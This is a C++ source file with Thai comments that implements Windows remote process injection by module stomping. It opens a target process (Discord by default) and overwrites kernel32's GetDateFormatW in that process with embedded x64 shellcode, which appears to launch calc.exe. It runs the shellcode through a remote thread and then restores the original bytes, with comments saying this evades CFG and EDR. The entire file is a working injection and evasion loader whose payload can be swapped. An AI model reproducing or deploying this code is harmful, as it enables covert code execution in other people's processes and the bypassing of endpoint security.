#include "DefRemote.h"
#include "ModularRemote.h"

using namespace std;

int main() {

	// Step 1 หา PID ของ Process เป้าหมายสำหรับการทำ Remote Injection
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	//const wchar_t targetName[] = { L'n', L'o', L't', L'e', L'p', L'a', L'd', L'.', L'e', L'x', L'e', 0 };
	//const wchar_t targetName[] = { L'c', L'm', L'd', L'.', L'e', L'x', L'e', 0};
	//const wchar_t targetName[] = { L'e', L'x', L'p', L'l', L'o', L'r', L'e', L'r', L'.', L'e', L'x', L'e', 0 };
	const wchar_t targetName[] = { L'd', L'i', L's', L'c', L'o', L'r', L'd', L'.', L'e', L'x', L'e', 0 };
	//const wchar_t targetName[] = { L'D', L'u', L'm', L'm', L'y', L'F', L'o', L'r', L'B', L'u', L'l', L'l', L'e', L't', L'T', L'e', L's', L't', L'.', L'e', L'x', L'e', 0 };

	DWORD PID = GetPIDByName(targetName, hSnapshot);
	if (PID == 0) {
		cout << "PID number is not found! \nError code is: " << GetLastError() << endl;
		return -1;
	}
	else {
		cout << "PID number is: " << hex << PID << endl;
	}
	//
	HMODULE hNtDll = GetModuleHandleW(L"ntdll.dll");
	pNtOpenProcess NtOpenProcess = reinterpret_cast<pNtOpenProcess>(GetProcAddress(hNtDll, "NtOpenProcess"));

	HANDLE hProcess = NULL;
	OBJECT_ATTRIBUTES objAttr;
	InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);

	CLIENT_ID clientId;
	clientId.UniqueProcess = (HANDLE)(ULONG_PTR)PID;
	clientId.UniqueThread = NULL;

	NTSTATUS status = NtOpenProcess(
		&hProcess,
		PROCESS_ALL_ACCESS,
		&objAttr,
		&clientId
	);
	if (status == 0) { // NTSTATUS 0 (STATUS_SUCCESS) คือสำเร็จ
		cout << "\nSuccessfully open process!" << endl;
	}
	else {
		cout << "Failed to change protection. NTSTATUS: 0x" << hex << status << endl;
		return -1;
	}

	// Step 2 ทำการค้นหา Dll เป้าหมายสำหรับ
	HMODULE victimDll = LoadLibraryW(L"kernel32.dll");

	PIMAGE_NT_HEADERS64 pNtHeader = getNtDll(victimDll);

	ULONG_PTR exportSection = pNtHeader->FileHeader.NumberOfSections;

	ExtractVictimBoxDetail refVictimBoxDetails = { 0 };

	DWORD Status = findTextSection(pNtHeader, victimDll, refVictimBoxDetails);
	if (Status != 0 || refVictimBoxDetails.VictimBox == NULL) {
		cout << "\nStatus of victim Dll is not found!" << "\nError code : " << GetLastError() << endl;
		cout << "Close hProcess \nError code is: " << GetLastError() << endl;
		CloseHandle(hProcess);
		return -1;
	}
	else {
		cout << "\nVictim .text is at: " << hex << (void*)refVictimBoxDetails.VictimBox << endl;
		cout << "Victim size is: " << refVictimBoxDetails.SizeOfBox << endl;
	}

	// ใน logic ส่วนนี้ เราจำเป็นต้องหลบ CFG และป้องกัน VirtualProtectEx ปัดเศษ address ของ dll ที่หามาได้ให้ตรงกับขนาดของ page (4096 byte) 
	// ขั้นตอนคือเราจะแบ่งการเปลี่ยน protection เป็น 2 รอบ รอบแรกเราจะเปลี่ยนแค่ 1 page (4096 byte) 
	// เพื่อให้แน่ใจว่าเราได้เปลี่ยน protection ของฟังก์ชันที่เราจะทำการ Stomp จริงๆ และหลบ CFG ได้สำเร็จ 
	// ส่วนรอบที่สอง เราจะเปลี่ยน protection ของพื้นที่ที่เหลือทั้งหมดเพื่อให้สามารถเขียน shellcode ลงไปได้

	// GetDateFormatW ใช้สำหรับแปลงข้อมูลวันที่ (Date) ให้กลายเป็นข้อความ (String) แบบ wide char
	PVOID pStompTarget = GetProcAddress(victimDll, "GetDateFormatW");	// ใช้ pStompTarget เพื่อเก็บฟังก์ชันที่เราจะ Stomp ของจริง
	if (pStompTarget == NULL) {
		cout << "Failed to find Export Function for stomping!" << endl;
		cout << "Close hProcess \nError code is: " << GetLastError() << endl;
		CloseHandle(hProcess);
		return -1;
	}
	cout << "CFG-Valid Stomp Target (GetDateFormatW) is at: 0x" << hex << pStompTarget << endl;

	// ขั้นตอนที่ 3 การเปลี่ยน Protect จาก R หรือ W เป็น RW
	pNtProtectVirtualMemory NtProtectVirtualMemory = reinterpret_cast<pNtProtectVirtualMemory>
		(GetProcAddress(hNtDll, "NtProtectVirtualMemory"));

	const uint8_t shellcode[] =
		"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
		"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
		"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
		"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
		"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
		"\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"
		"\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"
		"\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
		"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"
		"\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"
		"\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"
		"\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
		"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
		"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
		"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f"
		"\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d\xff"
		"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
		"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c"
		"\x63\x2e\x65\x78\x65\x00";

	// ตรวจขนาดของ shellcode ว่าใหญ่กว่าขนาดของ .text section หรือไม่
	if (sizeof(shellcode) > refVictimBoxDetails.SizeOfBox) {
		cout << "Error: Shellcode is larger than the .text section!" << endl;
		cout << "Close hProcess \nError code is: " << GetLastError() << endl;
		CloseHandle(hProcess);
		return -1;
	}

	//PVOID pStompTarget = refVictimBoxDetails.VictimBox;

	// เขยิบพิกัดลึกเข้าไปในห้อง .text อีก 0x2000 (8,192 ไบต์) เพื่อหนีโซนหน้าประตู
	PVOID pProtectAddress = pStompTarget;			// พิกัดห้อง นำฟังก์ชันที่จะ stomp จริงมาเก็บไว้
	SIZE_T ProtectSize = sizeof(shellcode);			// ขนาดของ shellcode รอบแรกเปลี่ยนแค่ขนาดของ shellcode เพื่อหลบ CFG
	DWORD dwOldProtect = { 0 };						// กล่องเก็บสิทธิ์เดิม (เอาไว้คืนค่าตอนหลัง)

	status = NtProtectVirtualMemory(
		hProcess,	          // hProcess ที่เราเปิดไว้ในขั้นตอนที่ 1
		&pProtectAddress,     // ต้องใส่ & เพราะเราใช้ Pointer ชี้หา Pointer อีกที (ใช้เมื่อต้องการยิงด้วย EventRegister)
		&ProtectSize,         // ต้องใส่ & เพราะเป็น parameter แบบ In/Out
		PAGE_READWRITE,       // เปลี่ยนเป็นสิทธิ์ อ่าน/เขียน (RW)
		&dwOldProtect         // เก็บสิทธิ์เก่าไว้ (ปกติจะได้ PAGE_EXECUTE_READ หรือ 0x20 กลับมา)
	);
	if (status == 0) { // NTSTATUS 0 (STATUS_SUCCESS) คือสำเร็จ
		cout << "\n[+] Successfully changed protection to RW!" << endl;
		cout << "[+] Old Protection was: 0x" << hex << dwOldProtect << endl;
	}
	else {
		cout << "[-] Failed to change protection. NTSTATUS: 0x" << hex << status << endl;
		cout << "Close hProcess \nError code is: " << GetLastError() << endl;
		CloseHandle(hProcess);
		return -1;
	}

	// Step 3.5: Backup ไบต์ดั้งเดิมเก็บไว้ในกระเป๋าเราก่อน
	auto NtReadVirtualMemory = reinterpret_cast<pNtReadVirtualMemory>
		(GetProcAddress(hNtDll, "NtReadVirtualMemory"));

	PVOID originalBytes = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(shellcode));
	SIZE_T bytesRead = 0;

	status = NtReadVirtualMemory(
		hProcess,
		pStompTarget,
		originalBytes,
		sizeof(shellcode),
		&bytesRead
	);
	if (status == 0) {
		cout << "[+] Successfully backed up original bytes (" << dec << bytesRead << " bytes)!" << endl;
	}
	else {
		cout << "[-] Failed to read original bytes. NTSTATUS: 0x" << hex << status << endl;
		return -1; // ถ้า Backup พลาด อย่าเพิ่งไปต่อครับ เดี๋ยวไม่มีอะไรคืนเขา
	}

	// Step 4 ทำการยัด Shellcode ของเราลงไป
	pNtWriteVirtualMemory NtWriteVirtualMemory = reinterpret_cast<pNtWriteVirtualMemory>
		(GetProcAddress(hNtDll, "NtWriteVirtualMemory"));

	SIZE_T bytesWritten = { 0 };

	status = NtWriteVirtualMemory(
		hProcess,
		pStompTarget,
		(PVOID)shellcode,
		sizeof(shellcode),
		&bytesWritten);
	if (status == 0) { // NTSTATUS 0 (STATUS_SUCCESS) คือสำเร็จ
		cout << "\n[+] Successfully written Shellcode!" << endl;
		cout << "[+] Byte written is at: 0x" << hex << bytesWritten << endl;
	}
	else {
		cout << "[-] Failed to write Shellcode. NTSTATUS: 0x" << hex << status << endl;
		cout << "Close hProcess \nError code is: " << GetLastError() << endl;
		CloseHandle(hProcess);
		return -1;
	}

	// Step 5 เปลี่ยน Protection เป็น RW เพื่อรัน Shellcode
	pProtectAddress = pStompTarget;
	ProtectSize = sizeof(shellcode);
	DWORD dwPreviousProtect = { 0 };

	status = NtProtectVirtualMemory(
		hProcess,
		&pProtectAddress,
		&ProtectSize,
		dwOldProtect,
		&dwPreviousProtect);
	if (status == 0) {
		cout << "\n[+] Protection restored to RX (0x20)." << endl;
	}
	else {
		cout << "Error, Cannot rolling protection to RX (0x20)" << "\nClose hProcess"
			"\nError code is: " << GetLastError() << endl;
		CloseHandle(hProcess);
		return -1;
	}

	cout << "\n[+] Pulling the trigger, run shellcode!" << endl;

	// Step 6 ลั่นไก
	HANDLE hThread = CreateRemoteThread(
		hProcess,
		NULL,
		0,
		(LPTHREAD_START_ROUTINE)pStompTarget,
		NULL,
		0,
		NULL
	);
	if (hThread != NULL) {
		cout << "\n[+] Create thread completed!" << endl;
	}
	else {
		cout << "Thread is not properlly create due to NULL value or wrong data in parameter!" <<
			"\nClose hThread and hProcess \nError code is: " << GetLastError() << endl;
		CloseHandle(hThread);
		CloseHandle(hProcess);
		return -1;
	}

	if (hThread != NULL) {
		WaitForSingleObject(hThread, INFINITE);
	}

	cout << "\nRestoring original bytes to evade EDR..." << endl;

	pProtectAddress = pStompTarget;
	ProtectSize = sizeof(shellcode);
	DWORD dwTempProtect = { 0 };

	// เปลี่ยน Protection เป็น RW เพื่อเขียนไบต์ดั้งเดิมคืนไป
	status = NtProtectVirtualMemory(
		hProcess,
		&pProtectAddress,
		&ProtectSize,
		PAGE_READWRITE,
		&dwTempProtect
	);

	SIZE_T bytesRestored = { 0 };

	status = NtWriteVirtualMemory(
		hProcess,
		pStompTarget,
		originalBytes,
		sizeof(shellcode),
		&bytesRestored
	);
	if (status == 0) {
		cout << "Successfully restored original bytes!" << endl;
	}
	else {
		cout << "Failed to restore original bytes. NTSTATUS: 0x" << hex << status << endl;
		CloseHandle(hProcess);
		CloseHandle(hThread);
		return -1;
	}

	// คืนสิทธิ์กลับเป็น RX เหมือนตอนที่ระบบเพิ่งบูทเสร็จ
	pProtectAddress = pStompTarget;
	ProtectSize = sizeof(shellcode);
	DWORD dwOriginProtect = { 0 };

	status = NtProtectVirtualMemory(hProcess, &pProtectAddress, &ProtectSize, dwTempProtect, &dwOriginProtect);
	if (status == 0) {
		cout << "Protection rolled back to Original (RX)." << endl;
	}

	DWORD exitCode = 0;
	GetExitCodeThread(hThread, &exitCode);
	cout << "\nRemote Thread exited with code: 0x" << hex << exitCode << endl;

	CloseHandle(hProcess);
	cout << "\nCloseHandle hProcess" << endl;

	CloseHandle(hThread);
	cout << "CloseHandle hThread" << endl;

	// ทำลายกล่องเก็บ Backup เพื่อป้องกัน Memory Leak
	if (originalBytes != NULL) {
		HeapFree(GetProcessHeap(), 0, originalBytes);

	}
	return 0;
}